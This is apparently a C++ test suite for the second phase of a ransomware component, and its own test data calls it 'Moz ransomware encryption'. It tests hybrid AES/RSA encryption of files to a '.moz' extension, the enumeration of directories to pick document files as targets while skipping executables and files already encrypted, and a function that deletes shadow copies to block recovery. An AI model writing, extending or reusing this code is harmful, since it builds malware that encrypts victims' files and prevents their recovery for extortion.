// Test for Moz Crypto Engine (Phase 2 - Hybrid Encryption)
#include "moz_crypto.h"
#include <iostream>
#include <cassert>
#include <random>
#include <fstream>
#include <filesystem>

using namespace moz;

int main() {
    std::cout << "=== Moz Crypto Engine Test Suite (Phase 2) ===" << std::endl;
    
    // Test 1: AES-256-GCM encryption/decryption
    std::cout << "\n[TEST 1] AES-256-GCM encryption/decryption..." << std::endl;
    {
        AESEngine aes;
        
        // Generate random key and data
        auto key = AESEngine::generateKey();
        assert(key.size() == 32);
        
        // Generate random test data
        std::vector<uint8_t> plaintext(1024);
        for (size_t i = 0; i < plaintext.size(); i++) {
            plaintext[i] = static_cast<uint8_t>(std::rand() % 256);
        }
        
        // Encrypt
        EncryptedBlob blob;
        assert(aes.encryptGCM(plaintext, key, blob) == true);
        assert(blob.ciphertext.size() == plaintext.size());
        assert(blob.iv.size() == 12);
        assert(blob.tag.size() == 16);
        
        // Decrypt
        std::vector<uint8_t> decrypted;
        assert(aes.decryptGCM(blob, key, decrypted) == true);
        assert(decrypted == plaintext);
        
        std::cout << "  PASSED: AES-256-GCM encrypt/decrypt" << std::endl;
        
        // Test data tampering detection (GCM auth tag)
        blob.ciphertext[0] ^= 0xFF;
        assert(aes.decryptGCM(blob, key, decrypted) == false);
        std::cout << "  PASSED: GCM tamper detection" << std::endl;
    }
    
    // Test 2: RSA-2048 key generation and encryption
    std::cout << "\n[TEST 2] RSA-2048 key generation and encryption..." << std::endl;
    {
        RSAEncryptor rsa;
        assert(rsa.generateKeyPair() == true);
        
        auto pubkey_der = rsa.getPublicKeyDER();
        assert(pubkey_der.size() > 0);
        
        // Test RSA encryption with public key
        std::vector<uint8_t> test_data = {0x48, 0x65, 0x6c, 0x6c, 0x6f}; // "Hello"
        std::vector<uint8_t> encrypted;
        assert(rsa.encryptWithPublicKey(test_data, encrypted) == true);
        assert(encrypted.size() == 256); // RSA-2048 output size
        
        // Decrypt
        std::vector<uint8_t> decrypted;
        assert(rsa.decryptWithPrivateKey(encrypted, decrypted) == true);
        assert(decrypted == test_data);
        
        std::cout << "  PASSED: RSA-2048 gen/encrypt/decrypt" << std::endl;
        std::cout << "  PASSED: Public key DER export (" << pubkey_der.size() << " bytes)" << std::endl;
    }
    
    // Test 3: Hybrid encryption workflow
    std::cout << "\n[TEST 3] Hybrid encryption workflow (AES+RSA)..." << std::endl;
    {
        CryptoEngine engine;
        
        // Initialize (self-generate RSA key pair)
        assert(engine.initialize({}) == true);
        
        // Get public key for "external" encryption
        auto pubkey = engine.getPublicKeyDER();
        assert(pubkey.size() > 0);
        
        // Create second engine with the public key (simulating external encryptor)
        RSAEncryptor verifier;
        assert(verifier.loadPublicKey(pubkey) == true);
        
        // Generate test data
        std::vector<uint8_t> plaintext(4096);
        for (size_t i = 0; i < plaintext.size(); i++) {
            plaintext[i] = static_cast<uint8_t>(i % 256);
        }
        
        // Hybrid encrypt
        EncryptedBlob blob;
        assert(engine.hybridEncrypt(plaintext, blob) == true);
        
        // Verify AES key was wrapped
        assert(blob.aes_key.size() == 256);
        
        // Hybrid decrypt
        std::vector<uint8_t> decrypted;
        assert(engine.hybridDecrypt(blob, decrypted) == true);
        assert(decrypted == plaintext);
        
        std::cout << "  PASSED: Hybrid encrypt/decrypt round-trip" << std::endl;
    }
    
    // Test 4: File encryption/decryption
    std::cout << "\n[TEST 4] File encryption/decryption..." << std::endl;
    {
        // Use a single CryptoEngine instance that both encrypts and decrypts
        FileEncryption fe;
        // Initialize crypto engine with self-generated key pair
        std::unique_ptr<CryptoEngine> engine = std::make_unique<CryptoEngine>();
        assert(engine->initialize({}) == true);
        fe.setCryptoEngine(std::move(engine));
        
        // Create test file
        std::string test_input = "/tmp/moz_test_input.txt";
        std::string test_output = "/tmp/moz_test_encrypted.moz";
        std::string test_final = "/tmp/moz_test_decrypted.txt";
        
        std::ofstream out(test_input, std::ios::binary);
        out << "This is a test file for Moz ransomware encryption.";
        out.close();
        
        // Encrypt
        assert(fe.encryptFile(test_input, test_output) == true);
        std::cout << "  File encrypted: " << test_output << std::endl;
        
        // Decrypt
        assert(fe.decryptFile(test_output, test_final) == true);
        
        // Verify content
        std::ifstream in(test_final, std::ios::binary);
        std::string content((std::istreambuf_iterator<char>(in)),
                           std::istreambuf_iterator<char>());
        assert(content == "This is a test file for Moz ransomware encryption.");
        
        std::cout << "  PASSED: File encryption/decryption round-trip" << std::endl;
        
        // Cleanup
        std::remove(test_input.c_str());
        std::remove(test_output.c_str());
        std::remove(test_final.c_str());
    }
    
    // Test 5: File targeting and enumeration
    std::cout << "\n[TEST 5] File targeting and enumeration..." << std::endl;
    {
        FileEncryption fe;
        fe.setMinFileSize(1);
        fe.setMaxFileSize(1024 * 1024);
        
        // Create test directory structure
        std::string test_dir = "/tmp/moz_test_dir";
        std::filesystem::create_directories(test_dir + "/subdir");
        
        // Create various files
        std::ofstream(test_dir + "/file1.txt") << "hello";
        std::ofstream(test_dir + "/file2.pdf") << "PDF content";
        std::ofstream(test_dir + "/file3.exe") << "binary";
        std::ofstream(test_dir + "/subdir/file4.docx") << "docx";
        std::ofstream(test_dir + "/subdir/file5.moz") << "already encrypted";
        
        // Enumerate files
        auto targets = fe.enumerateFiles({test_dir});
        
        std::cout << "  Scanned: " << targets.total_scanned << " files" << std::endl;
        std::cout << "  Target: " << targets.paths.size() << " files" << std::endl;
        std::cout << "  Skipped: " << targets.skipped.size() << " files" << std::endl;
        
        assert(targets.total_scanned == 5);
        assert(targets.paths.size() == 3); // txt, pdf, docx
        assert(targets.skipped.size() == 2); // exe and .moz
        
        std::cout << "  PASSED: File targeting logic" << std::endl;
        
        // Cleanup
        std::filesystem::remove_all(test_dir);
    }
    
    // Test 6: PBKDF2 key derivation
    std::cout << "\n[TEST 6] PBKDF2 key derivation..." << std::endl;
    {
        auto salt = AESEngine::generateIV(); // Use IV function just for random bytes
        auto key1 = AESEngine::deriveKeyFromPassword("password123", salt, 10000);
        auto key2 = AESEngine::deriveKeyFromPassword("password123", salt, 10000);
        
        assert(key1.size() == 32);
        assert(key2.size() == 32);
        assert(key1 == key2);
        
        auto key3 = AESEngine::deriveKeyFromPassword("password456", salt, 10000);
        assert(key3 != key1); // Different password = different key
        
        std::cout << "  PASSED: PBKDF2 key derivation" << std::endl;
    }
    
    // Test 7: AntiRecovery (Windows-only, stub on Linux)
    std::cout << "\n[TEST 7] AntiRecovery functions..." << std::endl;
    {
        bool result = AntiRecovery::deleteShadowCopies();
        std::cout << "  Shadow copy deletion: " << (result ? "ok" : "not applicable on this platform") << std::endl;
        std::cout << "  PASSED: AntiRecovery compiles and runs" << std::endl;
    }
    
    std::cout << "\n=== All Phase 2 tests passed ===" << std::endl;
    return 0;
}
